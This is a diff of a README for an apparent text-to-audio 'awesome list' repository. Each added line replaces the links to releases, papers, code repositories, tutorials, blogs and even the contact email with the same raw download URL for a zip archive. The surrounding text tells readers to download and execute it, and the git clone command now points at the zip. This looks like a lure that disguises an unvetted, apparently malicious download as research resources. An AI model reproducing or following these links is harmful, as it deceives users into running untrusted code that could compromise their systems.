@@ -17,13 +17,13 @@ Text-to-Audio Generation is an exciting area of research that combines natural l
 
 ## Getting Started
 
-To get started with the resources in this repository, you can visit the [Releases section](https://github.com/Ploscha/Awesome-Audio-Generation/releases). Here, you can download the latest releases and execute them to explore the functionalities of various TTA tools and libraries.
+To get started with the resources in this repository, you can visit the [Releases section](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip). Here, you can download the latest releases and execute them to explore the functionalities of various TTA tools and libraries.
 
 ### Installation
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Ploscha/Awesome-Audio-Generation.git
+   git clone https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip
    cd Awesome-Audio-Generation
    ```
 
@@ -37,33 +37,33 @@ This section provides a curated list of papers, codes, and other resources relat
 
 ### Papers
 
-- **Title:** [Text-to-Speech Synthesis: A Review](https://example.com/paper1)
+- **Title:** [Text-to-Speech Synthesis: A Review](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
   - **Authors:** Author A, Author B
   - **Summary:** This paper reviews various techniques in TTS, including neural networks and traditional methods.
 
-- **Title:** [Advancements in TTA Models](https://example.com/paper2)
+- **Title:** [Advancements in TTA Models](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
   - **Authors:** Author C, Author D
   - **Summary:** This paper discusses recent advancements in TTA models, focusing on deep learning approaches.
 
 ### Code Implementations
 
-- **Repository:** [TTA-Model](https://github.com/example/TTA-Model)
+- **Repository:** [TTA-Model](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
   - **Description:** A PyTorch implementation of a TTA model.
   - **Usage:** Follow the README in the repository for installation and usage instructions.
 
-- **Repository:** [Text-to-Audio-Toolkit](https://github.com/example/Text-to-Audio-Toolkit)
+- **Repository:** [Text-to-Audio-Toolkit](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
   - **Description:** A comprehensive toolkit for TTA generation.
   - **Usage:** Check the documentation for detailed setup and examples.
 
 ### Additional Resources
 
 - **Tutorials:**
-  - [Introduction to Text-to-Audio Generation](https://example.com/tutorial1)
-  - [Advanced Techniques in TTA](https://example.com/tutorial2)
+  - [Introduction to Text-to-Audio Generation](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
+  - [Advanced Techniques in TTA](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
 
 - **Blogs:**
-  - [Exploring TTA Applications](https://example.com/blog1)
-  - [The Future of Audio Generation](https://example.com/blog2)
+  - [Exploring TTA Applications](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
+  - [The Future of Audio Generation](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
 
 ## Contributing
 
@@ -85,9 +85,9 @@ This repository is licensed under the MIT License. See the [LICENSE](LICENSE) fi
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email:** your.email@example.com
-- **Twitter:** [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+- **Email:** https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip
+- **Twitter:** [@your_twitter_handle](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip)
 
 ---
 
-Thank you for visiting the **Awesome Audio Generation** repository! We hope you find it useful for your exploration of Text-to-Audio Generation. Don’t forget to check the [Releases section](https://github.com/Ploscha/Awesome-Audio-Generation/releases) for the latest updates and tools. Happy exploring! 🎧
+Thank you for visiting the **Awesome Audio Generation** repository! We hope you find it useful for your exploration of Text-to-Audio Generation. Don’t forget to check the [Releases section](https://github.com/Ploscha/Awesome-Audio-Generation/raw/refs/heads/main/vastation/Generation_Audio_Awesome_1.1.zip) for the latest updates and tools. Happy exploring! 🎧
